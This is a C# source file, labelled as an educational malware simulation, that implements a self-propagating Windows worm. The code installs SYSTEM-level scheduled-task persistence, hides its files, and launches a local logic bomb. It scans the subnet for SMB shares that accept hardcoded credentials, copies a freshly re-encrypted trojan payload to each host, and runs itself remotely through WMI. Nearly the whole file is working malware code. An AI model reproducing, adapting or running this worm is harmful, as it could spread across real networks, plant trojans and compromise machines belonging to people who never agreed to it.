using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using SharedCrypto;

/// <summary>
/// EDUCATIONAL MALWARE SIMULATION - FOR CYBERSECURITY COURSE ONLY
/// Self-Propagating Worm with Random Key Encryption and Persistence
/// MUST ONLY BE RUN IN ISOLATED VM ENVIRONMENTS
/// </summary>
class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";
    private const string KEY_FILE_NAME = "key.dat";
    private const string SHARED_CRYPTO_DLL = "SharedCrypto.dll";
    private const string SHARED_CRYPTO_PDB = "SharedCrypto.pdb";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_INTERVAL_MINUTES = 10;

    private const string WORM_TASK_NAME = "Malicious_Worm";
    private const string LOGICBOMB_TASK_NAME = "Malicious_LogicBomb";

    private static string logFilePath;

    static async Task Main()
    {
        Console.WriteLine("===========================================");
        Console.WriteLine("PERSISTENT SELF-PROPAGATING WORM");
        Console.WriteLine("Educational Malware Simulation - Random Key Edition");
        Console.WriteLine("===========================================");
        Console.WriteLine();

        string baseDir = AppDomain.CurrentDomain.BaseDirectory;

        string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
        string logFileName = $"Worm_log_{timestamp}.txt";
        logFilePath = Path.Combine(baseDir, logFileName);

        LogToFile("========================================");
        LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
        LogToFile($"Base Directory: {baseDir}");
        LogToFile("========================================");

        try
        {
            LogInfo("Installing persistence...");
            InstallPersistence();

            LogInfo("Setting file attributes...");
            SetFileAttributes();

            LogInfo("Starting LogicBomb locally...");
            StartLogicBombLocally();

            LogInfo("Starting continuous network scanning...");
            await ContinuousScanLoop();
        }
        catch (Exception ex)
        {
            LogError($"Critical error in main loop: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    private static void InstallPersistence()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
            string logicBombPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME, LOGICBOMB_EXE_NAME);

            if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
            {
                LogSuccess($"Worm persistence installed: {WORM_TASK_NAME}");
            }
            else
            {
                LogWarning($"Failed to create Worm scheduled task.");
            }

            if (File.Exists(logicBombPath))
            {
                if (CreateScheduledTask(LOGICBOMB_TASK_NAME, logicBombPath))
                {
                    LogSuccess($"LogicBomb persistence installed: {LOGICBOMB_TASK_NAME}");
                }
                else
                {
                    LogWarning($"Failed to create LogicBomb scheduled task.");
                }
            }
            else
            {
                LogWarning($"LogicBomb.exe not found at {logicBombPath}, skipping persistence.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Persistence installation failed: {ex.Message} - continuing anyway");
        }
    }

    private static bool CreateScheduledTask(string taskName, string exePath)
    {
        try
        {
            var deleteTask = new ProcessStartInfo("schtasks.exe", $"/Delete /TN \"{taskName}\" /F")
            { CreateNoWindow = true, UseShellExecute = false };
            Process.Start(deleteTask)?.WaitForExit();

            var createTask = new ProcessStartInfo("schtasks.exe", $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true
            };

            using (var process = Process.Start(createTask))
            {
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                if (process.ExitCode == 0) return true;
                LogToFile($"Failed to create task {taskName}: {error}");
                return false;
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Exception creating task {taskName}: {ex.Message}");
            return false;
        }
    }

    private static void SetFileAttributes()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            SetHiddenSystemAttribute(Process.GetCurrentProcess().MainModule.FileName);
            SetHiddenSystemAttribute(Path.Combine(baseDir, SHARED_CRYPTO_DLL));
            SetHiddenSystemAttribute(Path.Combine(baseDir, SHARED_CRYPTO_PDB));

            string payloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(payloadDir))
            {
                SetHiddenSystemAttribute(Path.Combine(payloadDir, KEY_FILE_NAME));
                SetHiddenSystemAttribute(Path.Combine(payloadDir, LOGICBOMB_EXE_NAME));
                SetHiddenSystemAttribute(Path.Combine(payloadDir, ENCRYPTED_BOMB_NAME));
                SetHiddenSystemAttribute(Path.Combine(payloadDir, SHARED_CRYPTO_DLL));
                SetHiddenSystemAttribute(Path.Combine(payloadDir, SHARED_CRYPTO_PDB));
                LogSuccess($"Set attributes for payload folder contents");
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to set file attributes: {ex.Message} - continuing anyway");
        }
    }

    private static void SetHiddenSystemAttribute(string path)
    {
        if (File.Exists(path))
        {
            File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
        }
    }

    private static void StartLogicBombLocally()
    {
        try
        {
            string logicBombPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME, LOGICBOMB_EXE_NAME);
            if (!File.Exists(logicBombPath))
            {
                LogWarning("LogicBomb.exe not found, skipping local start");
                return;
            }
            if (Process.GetProcessesByName("LogicBomb").Any())
            {
                LogInfo("LogicBomb already running locally");
                return;
            }
            Process.Start(new ProcessStartInfo(logicBombPath) { UseShellExecute = true, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
            LogSuccess("LogicBomb started locally");
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to start LogicBomb locally: {ex.Message}");
        }
    }

    private static async Task ContinuousScanLoop()
    {
        int scanCount = 0;
        while (true)
        {
            scanCount++;
            LogInfo($"========== SCAN #{scanCount} ==========");
            try
            {
                string localIP = GetLocalIPAddress();
                if (string.IsNullOrEmpty(localIP))
                {
                    LogError("Could not detect local IP address, retrying in 10 minutes");
                }
                else
                {
                    string baseIP = string.Join(".", localIP.Split('.').Take(3));
                    LogInfo($"Local IP: {localIP}, Scanning network: {baseIP}.1 - {baseIP}.254");

                    List<string> smbHosts = await FindSmbServersAsync(baseIP);
                    LogInfo($"Scan complete: Found {smbHosts.Count} SMB host(s)");

                    foreach (string ip in smbHosts)
                    {
                        await ProcessTargetHost(ip);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error during scan #{scanCount}: {ex.Message}");
            }

            LogInfo($"Scan #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes...");
            await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
        }
    }

    private static async Task ProcessTargetHost(string ip)
    {
        LogInfo($"--- Processing target: {ip} ---");
        if (IsWormAlreadyRunningOnTarget(ip))
        {
            LogInfo($"Worm already running on {ip}, skipping");
            return;
        }

        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);

        if (smbConnectResult != 0)
        {
            LogWarning($"SMB connection to {ip} failed - Error: {GetWNetErrorDescription(smbConnectResult)}");
            return;
        }

        LogSuccess($"Connected to {ip}");
        string victimPackagePath = null;
        try
        {
            victimPackagePath = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
            PrepareVictimSpecificPackage(victimPackagePath);

            await CopyFolderAsync(victimPackagePath, remoteShareUNC);
            LogSuccess($"Copied victim-specific package to {ip}");

            SetRemoteFileAttributes(ip, remoteShareUNC);

            string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
            LogInfo($"Attempting to execute Worm remotely on {ip}...");
            if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath))
            {
                LogSuccess($"Successfully propagated to {ip}");
            }
            else
            {
                LogWarning($"File copy succeeded but WMI execution failed on {ip}");
            }
        }
        catch (Exception ex)
        {
            LogError($"Error processing {ip}: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
        finally
        {
            DisconnectFromRemoteShare(remoteShareUNC);
            if (victimPackagePath != null && Directory.Exists(victimPackagePath))
            {
                try { Directory.Delete(victimPackagePath, true); } catch { }
            }
        }
    }

    private static void PrepareVictimSpecificPackage(string tempPackagePath)
    {
        LogInfo("Preparing unique encrypted package for victim...");
        Directory.CreateDirectory(tempPackagePath);

        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        string basePayloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
        string tempPayloadDir = Path.Combine(tempPackagePath, PAYLOAD_FOLDER_NAME);
        Directory.CreateDirectory(tempPayloadDir);

        File.Copy(Path.Combine(baseDir, WORM_EXE_NAME), Path.Combine(tempPackagePath, WORM_EXE_NAME));
        File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_DLL), Path.Combine(tempPackagePath, SHARED_CRYPTO_DLL));
        if (File.Exists(Path.Combine(baseDir, SHARED_CRYPTO_PDB)))
            File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_PDB), Path.Combine(tempPackagePath, SHARED_CRYPTO_PDB));

        File.Copy(Path.Combine(basePayloadDir, LOGICBOMB_EXE_NAME), Path.Combine(tempPayloadDir, LOGICBOMB_EXE_NAME));
        File.Copy(Path.Combine(basePayloadDir, SHARED_CRYPTO_DLL), Path.Combine(tempPayloadDir, SHARED_CRYPTO_DLL));
        if (File.Exists(Path.Combine(basePayloadDir, SHARED_CRYPTO_PDB)))
            File.Copy(Path.Combine(basePayloadDir, SHARED_CRYPTO_PDB), Path.Combine(tempPayloadDir, SHARED_CRYPTO_PDB));

        string oldKey = File.ReadAllText(Path.Combine(basePayloadDir, KEY_FILE_NAME));
        string newKey = CryptoUtils.GenerateRandomKey();
        LogInfo($"Re-encrypting payload with new key: {newKey}");

        string originalBombPath = Path.Combine(basePayloadDir, ENCRYPTED_BOMB_NAME);
        string tempTrojanPath = Path.Combine(tempPackagePath, "Trojan.exe");
        string finalBombPath = Path.Combine(tempPayloadDir, ENCRYPTED_BOMB_NAME);

        CryptoUtils.DecryptFile(originalBombPath, tempTrojanPath, oldKey);
        CryptoUtils.EncryptFile(tempTrojanPath, finalBombPath, newKey);

        File.WriteAllText(Path.Combine(tempPayloadDir, KEY_FILE_NAME), newKey);

        File.Delete(tempTrojanPath);
        LogSuccess("Victim-specific package created successfully.");
    }

    private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = SMB_USERNAME, Password = SMB_PASSWORD, Timeout = TimeSpan.FromSeconds(10) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            var searcher = new ManagementObjectSearcher(scope, new ObjectQuery("SELECT * FROM Win32_Process WHERE Name = 'Worm.exe'"));
            return searcher.Get().Count > 0;
        }
        catch { return false; }
    }

    private static void SetRemoteFileAttributes(string remoteIp, string remoteShareUNC)
    {
        try
        {
            SetHiddenSystemAttribute(Path.Combine(remoteShareUNC, WORM_EXE_NAME));
            SetHiddenSystemAttribute(Path.Combine(remoteShareUNC, SHARED_CRYPTO_DLL));
            SetHiddenSystemAttribute(Path.Combine(remoteShareUNC, SHARED_CRYPTO_PDB));

            string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(remotePayloadFolder))
            {
                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, KEY_FILE_NAME));
                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, LOGICBOMB_EXE_NAME));
                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, ENCRYPTED_BOMB_NAME));
                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, SHARED_CRYPTO_DLL));
                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, SHARED_CRYPTO_PDB));
            }
            LogSuccess($"Set file attributes on {remoteIp}");
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to set attributes on {remoteIp}: {ex.Message}");
        }
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        var tasks = Enumerable.Range(1, 254).Select(async i =>
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();
            try
            {
                using (var ping = new Ping())
                {
                    if ((await ping.SendPingAsync(ip, PING_TIMEOUT_MS)).Status == IPStatus.Success)
                    {
                        if (ConnectToRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}", SMB_USERNAME, SMB_PASSWORD) == 0)
                        {
                            lock (activeHosts) activeHosts.Add(ip);
                            DisconnectFromRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}");
                        }
                    }
                }
            }
            catch { }
            finally { semaphore.Release(); }
        });
        await Task.WhenAll(tasks);
        return activeHosts;
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        var files = Directory.GetFiles(source).Select(async file =>
        {
            try
            {
                await Task.Run(() => File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));
            }
            catch (Exception ex) { LogWarning($"Failed to copy {Path.GetFileName(file)}: {ex.Message}"); }
        });
        var dirs = Directory.GetDirectories(source).Select(dir => CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir))));
        await Task.WhenAll(files.Concat(dirs));
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                return socket.LocalEndPoint.ToString().Split(':')[0];
            }
        }
        catch
        {
            return null;
        }
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = username, Password = password, Impersonation = ImpersonationLevel.Impersonate, EnablePrivileges = true, Timeout = TimeSpan.FromSeconds(30) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = commandToExecute;
                var outParams = processClass.InvokeMethod("Create", inParams, null);
                return outParams != null && (Convert.ToInt32(outParams["returnValue"]) == 0 || Convert.ToInt32(outParams["returnValue"]) == 2);
            }
        }
        catch { return false; }
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE { dwType = 1, lpRemoteName = remotePath };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try { WNetCancelConnection2(remotePath, 0, true); } catch { }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope; public int dwType; public int dwDisplayType; public int dwUsage;
        public string lpLocalName; public string lpRemoteName; public string lpComment; public string lpProvider;
    }

    // --- MODIFIED: Central logging method updated with descriptive prefixes ---
    private static void Log(string message, ConsoleColor color)
    {
        string prefix;
        switch (color)
        {
            case ConsoleColor.Green:
                prefix = "[SUCCESS]";
                break;
            case ConsoleColor.Yellow:
                prefix = "[WARNING]";
                break;
            case ConsoleColor.Red:
                prefix = "[ERROR]";
                break;
            case ConsoleColor.Cyan:
            default:
                prefix = "[INFO]";
                break;
        }

        string logMessage = $"{prefix} {message}";
        Console.ForegroundColor = color;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }
    private static void LogInfo(string message) => Log(message, ConsoleColor.Cyan);
    private static void LogSuccess(string message) => Log(message, ConsoleColor.Green);
    private static void LogWarning(string message) => Log(message, ConsoleColor.Yellow);
    private static void LogError(string message) => Log(message, ConsoleColor.Red);
    private static void LogToFile(string message)
    {
        try { File.AppendAllText(logFilePath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}"); } catch { }
    }

    private static string GetWNetErrorDescription(int errorCode)
    {
        switch (errorCode)
        {
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"Error code {errorCode}";
        }
    }
}